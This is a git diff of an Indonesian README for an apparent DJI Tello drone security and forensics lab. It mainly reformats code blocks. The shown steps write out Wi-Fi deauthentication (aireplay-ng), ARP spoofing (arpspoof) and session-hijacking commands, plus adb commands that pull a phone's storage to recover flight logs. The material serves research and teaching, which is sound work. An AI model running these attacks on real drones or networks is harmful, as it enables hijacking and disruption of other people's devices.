@@ -9,10 +9,8 @@
 ---
 
 ## 📺 Demo Aplikasi  
-Embed video demo di bawah ini (ganti `VIDEO_ID` dengan ID video YouTube Anda):  
-
 [![Demo Aplikasi](https://i.ytimg.com/vi/17bLWl3gKGE/maxresdefault.jpg)](https://www.youtube.com/watch?v=17bLWl3gKGE)  
-*Klik gambar di atas untuk menonton demo*
+**Klik gambar di atas untuk menonton demo**
 ---
 
 *Konten selanjutnya hanya merupakan contoh awalan yang baik. Anda dapat berimprovisasi bila diperlukan.*
@@ -53,19 +51,25 @@ Embed video demo di bawah ini (ganti `VIDEO_ID` dengan ID video YouTube Anda):
    ```sudo airmon-ng start <interface>```
 
    ```sudo airodump-ng <interface_mon>```
-   ```sudo iwconfig <interface_mon> channel <channel>
-   sudo aireplay-ng --deauth <jumlah paket> -a <MAC Drone> -c <MAC Client> <interface_mon>```
+   ```
+   sudo iwconfig <interface_mon> channel <channel>
+   sudo aireplay-ng --deauth <jumlah paket> -a <MAC Drone> -c <MAC Client> <interface_mon>
+   ```
 
    - **Skenario ARP Spoofing**:
    Sebelum menjalankan serangan, pastikan mesin penyerang terhubung pada jaringan drone DJI Tello.
-   ```sysctl-w net.ipv4.ip_forward=1
+   ```
+   sysctl-w net.ipv4.ip_forward=1
    sudo arpspoof -i wlan0 -t <ip client> <ip drone>
-   sudo arpspoof -i wlan0 -t <ip drone> <ip client>```
+   sudo arpspoof -i wlan0 -t <ip drone> <ip client>
+   ```
 
    - **Skenario Session Hijacking**:
    Sebelum menjalankan serangan, pastikan mesin penyerang terhubung pada jaringan drone DJI Tello.
-   ```cd hijack
-   python tello_control.py```
+   ```
+   cd hijack
+   python tello_control.py
+   ```
 
    - **Capture Jaringan dengan Wireshark**:
    ```sudo wireshark```
@@ -75,10 +79,12 @@ Embed video demo di bawah ini (ganti `VIDEO_ID` dengan ID video YouTube Anda):
    - Pertama-tama, download adb (android debug bridge) pada tautan https://developer.android.com/tools/adb:
    - Hubungkan perangkat android menggunakan USB pada mesin.
    - Jalankan command berikut pada direktori download adb: 
-   ```adb start-server
+   ```
+   adb start-server
    adb devices -l
    adb shell ls
-   adb pull /storage/emulated/0/```
+   adb pull /storage/emulated/0/
+   ```
    - Pada android, log penerbangan DJI Tello ditemukan pada direktori `/0/Android/data/com.ryzerobotics.tello/files/droneLog/`, sedangkan video penerbangan pada direktori `/0/Movies/TelloVideo/`
 
 6. **Proses Log dengan DatCon**
